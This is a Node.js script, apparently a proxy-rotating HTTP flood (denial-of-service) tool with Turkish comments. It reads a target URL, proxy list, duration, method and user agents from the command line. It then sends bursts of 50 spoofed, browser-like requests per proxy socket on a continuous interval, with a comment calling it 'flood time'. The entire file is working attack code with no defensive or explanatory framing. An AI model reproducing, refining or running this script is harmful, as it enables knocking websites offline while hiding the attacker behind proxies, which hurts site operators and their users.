const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;

const request = require('request');
const fs = require('fs');
const url = require("url");
const proxies = fs.readFileSync(process.argv[3], 'utf-8').match(/\S+/g);
const userAgents = fs.readFileSync(process.argv[6], 'utf-8').replace(/\r/g, '').split('\n');
var host = url.parse(process.argv[2]).host;
process.on('uncaughtException', (err) => { });
process.on('unhandledRejection', (err) => { });
const UAs = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.114 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
];
setTimeout(() => { process.exit(1); }, process.argv[4] * 1000);

setInterval(() => { 
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    var useragent = userAgents[Math.floor(Math.random() * userAgents.length)];

    var netSocket = require('net').Socket(); //soket oluştur.
    netSocket.connect(proxy.split(':')[1], proxy.split(':')[0]); //proxy ile bağlan.
    netSocket.setTimeout(5000); // 30 saniye timeout
    for (var i = 0; i < 50; i++) { // i < 200; bölümünü elleyebilirsin 200'ü 300 veya 50 vb yapabilirsin threads dediğimiz bu oluyor.
        netSocket.write(`${process.argv[5]} ${process.argv[2]} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${useragent}\r\nReferer: ${process.argv[2]}\r\nAccept: */*\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: *\r\nAccept-Language: *\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nSec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\nMax-Forwards: 10\r\nX-Forwarded-For: ${proxy.split(':')[0]}\r\nConnection: Keep-Alive\r\n\r\n`); //flood time xD
    }
    netSocket.on('data', function () { setTimeout(function () { netSocket.destroy(); return delete netSocket; }, 3000); }) //30 saniye sonra s soketini yok et.
 });
console.log("Brust sent using %s method!", process.argv[5]);

function AttackRequest(proxy)
{
    request({
        method: process.argv[5],
        url: process.argv[2],
        followRedirect: true,
        timeout: 10000,
        headers: 
        { 
            "Referer" : process.argv[2],
            "Accept" : "*/*",
            "User-Agent" : userAgents[Math.floor(Math.random() * userAgents.length)],
            "Upgrade-Insecure-Requests" : "1",
            "Accept-Encoding" : "*",
            "Accept-Language" : "*",
            "Cache-Control" : "no-cache",
            "Pragma": "no-cache",
            "Sec-ch-ua": '"Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Connection" : "keep-alive",
            "Max-Forwards": "10",
            "X-Forwarded-For" : proxy.split(':')[0]
        },
        proxy: 'http://' + proxy
    }, function (error, response, body) { console.log("Error: " + response.statusCode); });
}